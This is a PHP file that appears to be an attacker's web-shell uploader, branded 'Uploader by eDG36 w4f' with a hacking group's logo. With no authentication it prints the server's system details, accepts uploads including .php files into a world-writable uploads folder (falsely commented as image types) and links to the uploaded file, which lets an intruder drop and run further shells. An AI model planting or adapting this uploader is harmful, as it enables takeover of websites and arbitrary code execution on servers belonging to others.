<?php
echo '<center style="background-color: #f0f0f0;"><img src="https://keralacyberdefenders.github.io/kcd.waf.github.io/IMG-20240316-WA0048.jpg" alt="Logo" style="width: 100px; height: 100px; border: 1px solid black;"><br><pre>'.php_uname()."\n".'<b style="color: black;">{ Uploader by eDG36 w4f }</b><form method="post" enctype="multipart/form-data">
    <input type="file" name="__" style="background-color: 
; color: black; border: 1px solid black;">
    <input name="_" type="submit" value="Upload>>" style="background-color: #ffffff; color: black; border: 1px solid black;">
</form>';

if($_POST){
    $allowed_types = array('file', 'html', 'png', 'php'); // allowed image types
    $max_size = 1024 * 1024; // 1MB maximum file size
    $upload_dir = 'uploads/'; // directory to store uploaded images

    if(!file_exists($upload_dir)){
        mkdir($upload_dir, 0777, true); // create the directory if it doesn't exist
    }

    $file_tmp = $_FILES['__']['tmp_name'];
    $file_name = $_FILES['__']['name'];
    $file_type = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));

    if(in_array($file_type, $allowed_types) && $_FILES['__']['size'] <= $max_size){
        $upload_file = $upload_dir . $file_name;
        if(@copy($file_tmp, $upload_file)){
            $image_url = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $upload_file;
            echo '<b style="color: black;">Ok Uploaded</b><br>Image URL: <a href="' . $image_url . '">' . $image_url . '</a>';
        }else{
            echo '<b style="color: black;">Not uploaded!</b>';
        }
    }else{
        echo '<b style="color: black;">Invalid file type or size!</b>';
    }
}
?>